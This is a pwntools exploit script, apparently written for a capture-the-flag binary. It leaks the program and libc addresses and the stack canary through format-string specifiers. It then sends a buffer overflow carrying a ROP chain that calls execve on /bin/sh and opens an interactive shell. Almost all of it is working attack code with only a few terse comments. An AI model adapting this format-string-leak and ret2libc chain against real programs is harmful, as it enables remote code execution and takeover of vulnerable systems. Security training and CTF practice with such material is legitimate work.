from pwn import *

elf = context.binary = ELF('./chall_patched')
p = process()
# p = remote('', 1337, ssl=True)
libc = ELF('./libc.so.6')
rop = ROP(libc)

p.sendlineafter('who are you?\n', '%27$p %3$p') #%3$p is write, and %27$p is main. The key is here: leak main and libc
p.recvuntil('hehe... hi,\n')
leak_main_s, leak_libc_s = p.recvline().strip().split()
leak_main = int(leak_main_s, 16)
leak_libc = int(leak_libc_s, 16)

pie = leak_main - elf.sym['main']
libc_base = leak_libc - 0x1046b6    #offset to libc_base  

log.success(f'pie: {hex(pie)}')
log.success(f'libc: {hex(libc_base)}')

# so now you can continue to leak canary
p.sendlineafter("won't tell anyone.\n", '%23$p') 
p.recvuntil('wow. okay. well:\n')
canary = int(p.recvline().strip(), 16)
log.success(f'canary: {hex(canary)}')

#then you can calculate it to get this all gadget
# rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
# ret = libc_base + rop.find_gadget(['ret'])[0]
# system = libc_base + libc.sym['system']

# but some reason, this works well. This need **IF** you use onegadget and want to get shell with execve
rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
ret = libc_base + rop.find_gadget(['ret'])[0]
rsi = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
rdx = libc_base + rop.find_gadget(['pop rdx', 'ret'])[0]
execve = libc_base + libc.sym['execve']
binsh   = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = flat(
      'A'*56, p64(canary), 'B'*8,
    p64(ret), p64(rdi), p64(binsh),
    p64(rsi), p64(0),
    p64(rdx), p64(0),
    p64(execve),
)

# payload = flat(
#     'A'*56, p64(canary), 'B'*8,
#     p64(ret),
#     p64(rdi), p64(binsh),
#     p64(system)
# )
p.sendafter(b'last words before it all burns?\n', payload)
p.interactive()